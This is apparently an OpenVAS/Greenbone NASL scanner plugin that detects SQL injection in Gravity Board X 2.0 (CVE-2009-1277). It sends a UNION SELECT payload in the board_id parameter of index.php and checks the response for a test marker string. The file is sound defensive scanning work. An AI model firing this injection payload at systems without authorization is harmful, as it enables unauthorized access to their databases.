# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:gravityboardx:gravity_board_x";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100101");
  script_version("2025-09-05T15:40:40+0000");
  script_tag(name:"last_modification", value:"2025-09-05 15:40:40 +0000 (Fri, 05 Sep 2025)");
  script_tag(name:"creation_date", value:"2009-04-05 13:52:05 +0200 (Sun, 05 Apr 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-1277");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Gravity Board X Multiple SQLi Vulnerabilities and RCE Vulnerability");

  script_tag(name:"qod_type", value:"remote_app");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_dependencies("gravity_board_x_detect.nasl");
  script_mandatory_keys("gravity_board_x/installed");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Gravity Board X is prone to multiple SQL injection (SQLi)
  vulnerabilities and a remote command execution (RCE) because it fails to sufficiently sanitize
  user- supplied data before using it in an SQL query.");

  script_tag(name:"impact", value:"Exploiting these issues could allow an attacker to execute arbitrary code, compromise
  the application. access or modify data, or exploit latent vulnerabilities in the underlying database.");

  script_tag(name:"affected", value:"Gravity Board X 2.0 is vulnerable, other versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to
  a newer release, disable respective features, remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/34370");
  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/index.php?action=viewboard&board_id=-1%27+union+select+0,0x53514c2d496e6a656374696f6e2d54657374,2+from+gbx_members+where+1=%271";

req = http_get(item:url, port:port);
buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
if (egrep(pattern:"SQL-Injection-Test", string: buf)) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
